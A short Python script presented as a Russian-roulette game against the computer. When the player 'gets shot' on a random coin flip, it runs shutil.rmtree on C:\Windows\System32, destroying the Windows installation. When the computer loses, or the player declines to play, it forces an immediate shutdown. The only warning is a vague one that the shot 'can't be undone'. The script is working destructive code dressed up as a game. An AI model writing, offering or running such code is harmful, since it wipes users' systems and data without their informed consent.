import random
import os
import time
import shutil

user_loss_folder = r'C:\Windows\System32'

def user_shoot():
    result = random.choice([True, False])
    if result:
        print("You got shot! Deleting folder...")
        time.sleep(2)
        shutil.rmtree(user_loss_folder)
        exit()
    else:
        print("You survived! Passing the gun to the computer...")
        time.sleep(2)
        computer_shoot()

def computer_shoot():
    result = random.choice([True, False])
    if result:
        print("Computer got shot! You win!")
        time.sleep(5)
        os.system('shutdown /s /t 1')
    else:
        print("Computer survived! Passing the gun to you...")
        time.sleep(2)
        user_shoot()

def start_game():
    print("You are about to fire a gun, and it can't be undone.")
    print("Are you sure you want to play this game?")
    confirmation = input("Type: yes / no").strip().lower()
    if confirmation == 'yes':
        print("It's your turn! Type 'fire' to take a shot.")
        while True:
            command = input("Type 'fire' to shoot: ").strip().lower()
            if command == 'fire':
                user_shoot()
    else:
        time.sleep(2)
        os.system('shutdown /s /t 1')

start_game()
